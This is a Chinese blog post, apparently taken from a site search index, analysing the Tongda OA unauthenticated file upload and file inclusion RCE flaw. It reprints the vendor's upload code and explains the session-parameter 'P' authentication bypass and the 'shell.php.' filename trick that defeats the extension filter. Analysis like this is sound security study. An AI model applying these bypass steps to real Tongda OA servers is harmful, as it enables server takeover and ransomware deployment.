<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>通达OA任意文件上传/文件包含RCE漏洞</title>
    <url>/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x00-漏洞背景"><a href="#0x00-漏洞背景" class="headerlink" title="0x00 漏洞背景"></a><strong>0x00 漏洞背景</strong></h1><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p>
<p>通达信科在2020年3月13日发布了更新包，修复了在/ispirit/im/upload.php的上传漏洞与在/ispirit/interface/gateway.php的包含漏洞，上传漏洞被黑产利用，用于投放勒索病毒。在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。</p>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a><strong>0x01 漏洞分析</strong></h1><h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a>1. 漏洞原理</h2><p>绕过身份验证文件上传部分<br>Webroot\ispirit\im\upload.php的源码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÞÎÄ¼þÉÏ´«'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÄ¼þÉÏ´«Ê§°Ü'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看下开头这一块，就是绕过的核心部分，这里获取了一个P，如果P存在或者不为空，就要包含上面的auth.php，所以通过这里的参数”P”绕过登录认证，就可以去下面的上传了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再往后就是两个IF条件句，只要进去了都要exit退出，所以要绕过才能进入上传的逻辑里面，$DEST_UID = $_POST[‘DEST_UID’]; 参数可控，要求不能为0 也不能为空就可以了。1&lt;=count($_FILES)判断是否有文件上传，如果上传包中存在文件且$UPLOAD_MODE == ‘1’则调用upload()上传。第一个下标必须是我们的input name值，因此我们的POST包的Content-Disposition: form-data; name=“ATTACHMENT”; filename=”jpg”中的name必须是’ATTACHMENT’。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前行的代码内容有upload函数，函数具体代码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'参数含有非法字符。'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'错误'</span>), _(<span class="string">'参数含有非法字符。'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'禁止上传后缀名为[%s]的文件'</span>), substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件名[%s]包含[/\\\'":*?&lt;&gt;|]等非法字符'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]大小为0字节'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了系统限制（%s）'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了表单限制'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传不完整'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败：找不到临时文件夹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]写入失败'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'未知错误[代码：%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'错误'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到is_uploadable()函数对文件名进行检查，跟进到该函数，位于inc/utility_file.php。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $POS = strrpos($FILE_NAME, <span class="string">'.'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $EXT_NAME = $FILE_NAME;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码意思是查找“.” 在文件名中最后一次出现的位置，然后从存在”.“ 开始匹配3位，判断后缀是否为php，,如果为php则返回false,否则将”.”之前的作为EXT_NAME，.php不行，只能是 shell.php. 或者 shell.php.png。配合文件包含漏洞。</p>
